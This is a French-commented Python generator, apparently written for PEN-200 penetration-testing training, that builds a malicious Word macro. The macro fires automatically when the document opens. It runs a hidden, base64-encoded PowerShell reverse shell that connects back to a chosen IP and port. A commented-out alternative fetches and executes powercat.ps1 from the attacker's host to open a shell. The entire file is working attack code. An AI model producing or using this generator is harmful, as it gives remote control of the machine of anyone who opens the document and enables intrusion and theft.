# Template de macro malveillante exécutant un reverse-shell
# Les deux arguments sont l'adresse d'écoute et le port d'écoute
# Il est extrêmement important de sauvegarder la macro au format .doc et non .docx parce que ce dernier n'a pas la même gestion des macros et rendrait notre macro non-persistante
# Voir le cours PEN-200 pour plus de détails

import sys, re, base64

if (len(sys.argv) == 3) and (re.match('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', sys.argv[1]) != None) and (0 <= int(sys.argv[2]) <= 65535):
    adresse = sys.argv[1]
    port = sys.argv[2]
else:
    print("Utilisation : python3 Macro_Malveillante.py [IP] [Port]")
    exit(1)

payload = '$client = New-Object System.Net.Sockets.TCPClient("'+ adresse + '",' + port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


# payload = 'IEX(New-Object System.Net.WebClient).DownloadString("http://' + adresse + '/powercat.ps1");powercat -c ' + adresse + ' -p ' + port + ' -e powershell'
#
# Autre payload
# Plus fiable mais nécessite de pouvoir télécharger
# Penser à démarrer Apache et à mettre powercat.ps1 dans /var/www/html si besoin


commande = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print("""
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
""")


n = 50
for i in range(0, len(commande), n):
	print("Str = Str + " + '"' + commande[i:i+n] + '"')


print("""
CreateObject("Wscript.Shell").Run Str
End Sub
""")
